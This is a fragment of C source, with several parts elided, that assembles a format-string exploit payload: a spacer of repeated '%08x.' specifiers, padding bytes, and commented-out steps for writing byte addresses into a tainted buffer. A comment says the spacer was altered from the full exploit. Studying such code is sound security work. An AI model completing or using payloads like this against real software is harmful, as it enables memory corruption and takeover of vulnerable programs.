...
char spacer[] = \
"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.";//This spacer was altered from what is present in the complete version of the exploit
...
int main(int argc, char *argv[]) {
	...
	strcat(taintedbuf, "BBAAAABBBBAAAABBBB");

	strcat(taintedbuf, spacer);

	//strcat(taintedbuf, spacer1);
	//strcat(taintedbuf, spacer);


/*
	strcat(taintedbuf, spacer2);
	strcat(taintedbuf, modifier);

	strcat(taintedbuf, spacer3);
	strcat(taintedbuf, modifier);

	strcat(taintedbuf, spacer4);
	strcat(taintedbuf, modifier);

	//Second byte address to the tainted buffer
*/
